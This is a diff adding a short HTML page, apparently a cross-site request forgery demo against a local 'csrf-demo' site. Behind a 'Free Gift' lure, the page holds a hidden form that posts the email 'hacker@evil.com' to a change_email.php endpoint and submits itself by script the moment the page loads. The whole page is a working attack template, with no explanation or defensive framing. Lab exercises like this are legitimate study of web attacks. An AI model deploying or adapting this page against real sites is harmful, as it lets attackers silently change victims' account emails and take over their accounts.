@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Free Gift 🎁</h2>
+
+<form action="http://localhost/csrf-demo/change_email.php" method="POST" id="csrfForm">
+    <input type="hidden" name="email" value="hacker@evil.com">
+</form>
+
+<script>
+document.getElementById("csrfForm").submit();
+</script>
+
+</body>
+</html>
